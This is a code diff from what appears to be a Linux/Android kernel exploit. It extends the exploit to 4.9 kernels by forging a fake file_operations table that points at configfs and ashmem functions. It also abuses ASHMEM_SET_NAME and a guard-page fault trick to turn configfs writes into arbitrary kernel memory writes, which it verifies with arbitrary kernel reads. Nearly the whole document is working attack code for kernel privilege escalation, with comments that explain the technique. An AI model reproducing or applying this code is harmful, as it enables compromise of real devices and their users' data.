@@ -557,6 +557,10 @@ void log_startup_context(void) {
       defined(SLIDE_STACK_WRITER_SIGRETURN) && \
       SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
   stack_writer = "sigreturn";
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_PTRACE) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_PTRACE
+  stack_writer = "ptrace";
 #endif
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
@@ -727,19 +731,32 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
+#if LEGACY_FOPS
+  /*
+   * 4.9 has .read/.write instead of .read_iter/.write_iter. Point read at
+   * configfs_read_file and write at configfs_write_file. llseek is filled in
+   * here because the post-load repair would zero the low bytes of .read.
+   */
+  put64(p, off + FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
+  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
+  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_FILE));
+#else
   put64(p, off + FOPS_LLSEEK_OFF,
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
   put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+#endif
   put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
   put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
   put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
   put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
   put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
   put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
+#if !LEGACY_FOPS
   put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+#endif
 }
 
 int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
@@ -2565,7 +2582,148 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   return 0;
 }
 
+#if LEGACY_FOPS
+/*
+ * 4.9 configfs write path.
+ *
+ * configfs_write_file() first copies the user buffer into buffer->page:
+ *
+ *   count = min(write_count, SIMPLE_ATTR_SIZE - 1);
+ *   copy_from_user(buffer->page, user, count);
+ *   buffer->page[count] = 0;
+ *
+ * and only then calls flush_write_buffer(), which dereferences the real
+ * /dev/ashmem dentry/inode.  If the source faults, copy_from_user() returns
+ * nonzero, the tail is zero-filled, page[count] is zeroed, and the function
+ * returns -EFAULT without ever reaching the dentry lookup.  The bytes copied
+ * before the fault have already landed at buffer->page.
+ *
+ * We therefore place the payload at the end of a page backed by PROT_NONE
+ * right after it and write one byte more than the payload.  addr+0 and
+ * addr+1 past the requested range are zeroed as collateral:
+ *   - copy_from_user() zero-fills the faulting byte;
+ *   - fill_write_buffer() stores buffer->page[count] = 0.
+ * callers must leave two harmless bytes after the range (see fops.c and
+ * restore_slide_boot_id()).
+ */
+#ifndef LEGACY_CONFIGFS_WRITE_CHUNK
+#define LEGACY_CONFIGFS_WRITE_CHUNK 64
+#endif
+
+static unsigned char *legacy_write_page;
+static size_t legacy_write_page_size;
+
+static int legacy_write_source_ready(void) {
+  if (legacy_write_page) {
+    return 1;
+  }
+  long page_size = sysconf(_SC_PAGESIZE);
+  if (page_size <= 0) {
+    errno = EINVAL;
+    return 0;
+  }
+  unsigned char *map = mmap(
+      NULL, (size_t)page_size * 2, PROT_READ | PROT_WRITE,
+      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (map == MAP_FAILED) {
+    return 0;
+  }
+  if (mprotect(map + page_size, (size_t)page_size, PROT_NONE) != 0) {
+    int saved_errno = errno;
+    munmap(map, (size_t)page_size * 2);
+    errno = saved_errno;
+    return 0;
+  }
+  legacy_write_page = map;
+  legacy_write_page_size = (size_t)page_size;
+  return 1;
+}
+
+static int legacy_write_prepare_page(int fd, uintptr_t page) {
+  /*
+   * configfs_write_file() locks buffer->mutex at area+0x20 before it touches
+   * buffer->page.  The ashmem area's name[] is only partially initialised by
+   * ashmem_open(), so every SET_NAME blob must zero the fake mutex or the
+   * next write will spin on a bogus owner.  The blob therefore spans
+   * area+0x0b..area+0x4b: pos tail, page, ops, mutex, and needs_read_fill.
+   *
+   * ASHMEM_SET_NAME is a NUL-terminated string copy and kernel addresses
+   * routinely contain zero bytes, so use try_set_ashmem_name_blob() instead
+   * of try_put_blob_no_zeros(), which would turn those address zero bytes
+   * (and the mutex) into 0x01.
+   */
+  unsigned char blob[CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN + 4];
+  memset(blob, 0, sizeof(blob));
+  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
+  return try_set_ashmem_name_blob(fd, blob, sizeof(blob));
+}
+
+static ssize_t configfs_write_once_legacy(
+    int fd, uintptr_t target, const void *data, size_t len) {
+  if (!data || !len || len > SSIZE_MAX) {
+    errno = EINVAL;
+    return -1;
+  }
+  if (target > UINTPTR_MAX - (len - 1)) {
+    errno = ERANGE;
+    return -1;
+  }
+  if (!legacy_write_source_ready()) {
+    return -1;
+  }
+
+  const unsigned char *input = data;
+  size_t done = 0;
+  while (done < len) {
+    size_t chunk = len - done;
+    if (chunk > LEGACY_CONFIGFS_WRITE_CHUNK) {
+      chunk = LEGACY_CONFIGFS_WRITE_CHUNK;
+    }
+    uintptr_t chunk_target = target + done;
+    unsigned char *source =
+      legacy_write_page + legacy_write_page_size - chunk;
+    memcpy(source, input + done, chunk);
+    if (legacy_write_prepare_page(fd, chunk_target) != 0) {
+      return -1;
+    }
+    errno = 0;
+    ssize_t wr = write(fd, source, chunk + 1);
+    int saved_errno = errno;
+    if (wr != -1 || saved_errno != EFAULT) {
+      pr_warning("legacy configfs write unexpected ret=%zd errno=%d "
+                 "target=%016zx len=%zu\n",
+                 wr, saved_errno, chunk_target, chunk);
+      errno = saved_errno ? saved_errno : EIO;
+      return -1;
+    }
+    done += chunk;
+  }
+
+  unsigned char verify[LEGACY_CONFIGFS_WRITE_CHUNK];
+  for (done = 0; done < len;) {
+    size_t chunk = len - done;
+    if (chunk > sizeof(verify)) {
+      chunk = sizeof(verify);
+    }
+    ssize_t rd = configfs_read_once(fd, target + done, verify, chunk);
+    if (rd != (ssize_t)chunk ||
+        memcmp(verify, input + done, chunk) != 0) {
+      pr_warning("legacy configfs write verify failed target=%016zx "
+                 "off=%zu ret=%zd errno=%d\n",
+                 target, done, rd, errno);
+      errno = EIO;
+      return -1;
+    }
+    done += chunk;
+  }
+  return (ssize_t)len;
+}
+#endif
+
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
+#if LEGACY_FOPS
+  return configfs_write_once_legacy(fd, target, data, len);
+#else
   unsigned char blob[128];
   const uintptr_t write_align = 0x01000000ULL;
   const uint32_t max_write_window = 0x02000000U;
@@ -2627,6 +2785,7 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   errno = 0;
   ssize_t wr = pwrite(fd, data, len, pos);
   return wr;
+#endif
 }
 
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
